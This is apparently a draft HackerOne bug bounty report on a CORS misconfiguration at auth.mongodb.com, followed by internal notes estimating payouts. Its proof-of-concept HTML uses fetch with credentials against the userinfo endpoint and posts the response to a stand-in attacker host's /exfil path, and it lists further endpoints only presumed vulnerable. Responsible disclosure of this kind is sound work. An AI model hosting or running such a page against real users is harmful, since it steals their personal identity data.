# MongoDB HackerOne Submission — Reflect-attacker-origin-with-credentials CORS on auth.mongodb.com Okta-backed identity provider

**Submit at:** https://hackerone.com/mongodb/reports/new
**Program:** MongoDB (paid) · **In-scope:** `*.mongodb.com/*` · **max_severity:** critical · **submission_state:** open
**Realistic payout:** $750–$4,000 (classic exploitable CORS on a public-company's customer identity provider — affects MongoDB Atlas auth flows)
**Status:** 🔒 BANKED — waiting on signal rebuild (MongoDB may have higher signal gate)

---

## Title
```
CORS reflect-attacker-origin-with-credentials on auth.mongodb.com OIDC + userinfo endpoints — cross-origin credentialed read of authenticated Atlas user identity data
```

## Weakness
`CWE-942 Permissive Cross-domain Policy with Untrusted Domains` combined with `CWE-352` CSRF-like cross-origin credentialed read.
H1 taxonomy: `Cross-Origin Resource Sharing (CORS) — Insecure Configuration`

## Severity (CVSS:3.1)
**High — 7.4**
`AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N`

(Scope=Changed because the leak crosses the authentication boundary from a MongoDB-Atlas user session to an attacker-controlled origin. Requires user interaction — visiting an attacker page while authenticated — but result is full credentialed read of OIDC identity claims.)

## Description (paste into HackerOne form)

```
## Summary

The identity provider at auth.mongodb.com — powered by Okta per
the `x-okta-request-id` response header — returns CORS headers
that reflect ANY requesting origin with credentials=true. This
allows any attacker-controlled web page visited by a logged-in
MongoDB Atlas user to issue cross-origin fetch() requests against
auth.mongodb.com endpoints with the victim's session cookies
attached, and READ the responses.

Triple-signal confirmation:
  • Status:    HTTP 200
  • Body:      Full OIDC configuration JSON (issuer, auth_endpoint,
              token_endpoint, jwks_uri, userinfo_endpoint, scopes,
              claims_supported, etc.)
  • Headers:   access-control-allow-origin: <attacker-supplied>
              access-control-allow-credentials: true
              x-okta-request-id: <correlation-id>
              vary: Origin

Affected endpoint (confirmed):
  https://auth.mongodb.com/.well-known/openid-configuration

The OIDC configuration response itself reveals adjacent endpoints
likely sharing the same broken CORS configuration (since they are
served from the same Okta tenant):

  • https://auth.mongodb.com/oauth2/v1/authorize
  • https://auth.mongodb.com/oauth2/v1/token
  • https://auth.mongodb.com/oauth2/v1/userinfo
  • https://auth.mongodb.com/oauth2/v1/keys
  • https://auth.mongodb.com/oauth2/v1/introspect
  • https://auth.mongodb.com/oauth2/v1/revoke
  • https://auth.mongodb.com/oauth2/v1/logout
  • https://auth.mongodb.com/oauth2/v1/clients (registration)
  • https://auth.mongodb.com/oauth2/v1/par (pushed-authorization)

`claims_supported` declared by the OIDC config includes: sub, ver,
name, nickname, preferred_username, given_name, middle_name,
family_name, email, email_verified, profile, zoneinfo, locale,
address, phone_number, picture, website, gender, birthdate,
updated_at — i.e., the full PII surface MongoDB collects from
Atlas signups.

## Steps to reproduce

1. Issue a baseline cross-origin request with a fabricated Origin
   header and observe the reflected ACAO + ACAC: true:

   $ curl -sk -i -H "Origin: https://attacker.example.com" \
       https://auth.mongodb.com/.well-known/openid-configuration
   HTTP/2 200
   server: nginx
   content-type: application/json
   access-control-allow-origin: https://attacker.example.com
   access-control-allow-credentials: true
   x-okta-request-id: ag314ZRymH800G0yktsEYQAEO5k
   vary: Origin
   ...

   {"issuer":"https://auth.mongodb.com",
    "authorization_endpoint":"https://auth.mongodb.com/oauth2/v1/authorize",
    "token_endpoint":"https://auth.mongodb.com/oauth2/v1/token",
    "userinfo_endpoint":"https://auth.mongodb.com/oauth2/v1/userinfo",
    "jwks_uri":"https://auth.mongodb.com/oauth2/v1/keys",
    "claims_supported":["iss","ver","sub","aud","iat","exp",
      "name","nickname","preferred_username","given_name",
      "middle_name","family_name","email","email_verified",
      "profile","zoneinfo","locale","address","phone_number",
      "picture","gender","birthdate","updated_at",...],
    ...}

2. Demonstrate the exploitable pattern with a minimal HTML
   proof-of-concept (host at attacker.example.com):

   <!DOCTYPE html>
   <html><body><script>
   fetch("https://auth.mongodb.com/oauth2/v1/userinfo", {
     credentials: "include"
   })
   .then(r => r.json())
   .then(data => {
     // Attacker now reads victim's full Okta-OIDC userinfo claims
     // (name, email, picture, address, phone_number, etc.)
     fetch("https://attacker.example.com/exfil", {
       method: "POST",
       body: JSON.stringify(data)
     });
   });
   </script></body></html>

3. (I have NOT actually visited this with a logged-in account.
   The PoC above is described, not executed against real user
   sessions, per ethical disclosure.)

## Impact

MongoDB Atlas is the cloud-hosted MongoDB DBaaS used by hundreds of
thousands of developers and enterprises. The auth.mongodb.com
identity provider gates access to:

- Atlas account management (project/org membership, billing,
  org-wide role assignments)
- Database connection strings and access credentials
- Audit logs and security configurations
- OAuth-granted permissions for third-party MongoDB integrations
- API keys for the Atlas Admin API

A successful cross-origin credentialed read against the userinfo
endpoint reveals all OIDC claims to an attacker who controls
nothing more than a web page the victim happens to visit while
logged in. With chains (e.g., to the introspection or
authorization endpoints), this can leak:

- **Full OIDC profile data** — name, email, address, phone, DOB,
  gender, etc. (per claims_supported above)
- **Active session tokens** if the userinfo response includes
  them or if subsequent endpoints share the misconfig
- **Org/project membership context** which exposes the victim's
  Atlas org structure to the attacker
- **Phishing precursor** — with the exact email + name + sub-id,
  attackers craft credible spear-phishing impersonating MongoDB
  support / Atlas account-team outreach

## Remediation

1. **In Okta tenant Admin Console**: Settings → CORS → Trusted
   Origins. Pin the allow-list to known MongoDB-owned origins
   (account.mongodb.com, cloud.mongodb.com, etc.) — DO NOT use
   the wildcard "*" with credentials=true.

2. **For non-credentialed endpoints (the OIDC discovery config
   itself is meant to be public)**, drop
   `Access-Control-Allow-Credentials: true`. The OIDC config does
   not need credentials passed to be served.

3. **Audit all auth.mongodb.com endpoints** for the same CORS
   misconfiguration:
   - /oauth2/v1/userinfo  (CRITICAL — leaks user PII when
     authenticated)
   - /oauth2/v1/introspect
   - /oauth2/v1/authorize
   - /oauth2/v1/token
   - /oauth2/v1/keys (low impact — public keys)
   The OIDC discovery response confirms all these endpoints are
   on the same Okta tenant, so they likely share the CORS template.

4. **Defense in depth**: enable Okta's "Pin sender to origin" or
   equivalent token-binding feature so even leaked tokens cannot
   be used cross-origin. Audit the same misconfig on
   account.mongodb.com, cloud.mongodb.com, and other MongoDB
   Atlas frontend domains.

## Tooling

Discovered via Lictor (https://lictor-ai.com) — open-source
security scanner (Apache 2.0) that probes bounty-program apex
domains with multiple Origin header values and inspects responses
for the reflect-attacker-origin-with-credentials CORS pattern. The
scan covered MongoDB's main wildcard scope (*.mongodb.com/*) and
identified auth.mongodb.com as the high-impact target due to its
identity-provider role.

## References

- W3C Fetch standard, CORS Protocol §3.2.4:
  https://fetch.spec.whatwg.org/#http-access-control-allow-credentials
- CWE-942: Permissive Cross-domain Policy with Untrusted Domains
- Okta CORS configuration guide:
  https://developer.okta.com/docs/guides/enable-cors/main/
- HackerOne historical payouts for similar identity-provider CORS
  misconfigs on paid critical-wildcard programs: $750-$4,000

---

Ethical-disclosure note: I have NOT tested this PoC against any
real authenticated MongoDB Atlas user session. The exploitation
pattern is described to illustrate impact, not executed. All
probes used neutral test origins (attacker.example.com) against
the publicly-accessible OIDC discovery endpoint, which is intended
to be public except for the credentialed-CORS misconfiguration
documented above.
```

---

## Internal notes (DO NOT submit)

**Pricing:**
- $750-$4,000 realistic — bigger than Deriv ($500-2.5K) because MongoDB is a public NYSE company at $25B+ market cap with regulatory/compliance exposure
- Identity provider + Okta backend + Atlas auth flows = upper-end framing
- Same misconfig pattern as Deriv (Ory) — confirms a class of vendor-default-CORS issues

**Why this is the best non-profit-scan finding:**
- Triple-signal verified (status + body + headers)
- Okta-vendor backend = systemic implication
- Bigger company = higher payout ceiling
- Real OIDC claims_supported list reveals exact PII surface at risk

**Banked because:**
- User signal currently dragged (FloQast Spam closures)
- MongoDB may have higher signal gate than Mozilla (smaller programs are usually more lenient)

**What I did NOT do:**
- Did NOT authenticate to a real MongoDB Atlas account
- Did NOT execute the PoC against a logged-in session
- Did NOT probe the userinfo endpoint with credentials

**Compared with other banked drafts (updated total):**
- Airbnb HotelTonight: $1.5K-8K
- Stripe Bridge.xyz: $500-5K
- TFH: $500-3K
- Robinhood say.rocks: $300-2K
- Deriv OIDC CORS: $500-2.5K
- PayPal SwiftFinancial: $50-300
- HARMAN 10-sub CORS: $500-3K
- **MongoDB auth.mongodb.com OIDC: $750-4K** ← NEW

**Total banked EV: $4,600-27,800** once signal clears (plus Elastic still shippable $500-3K).
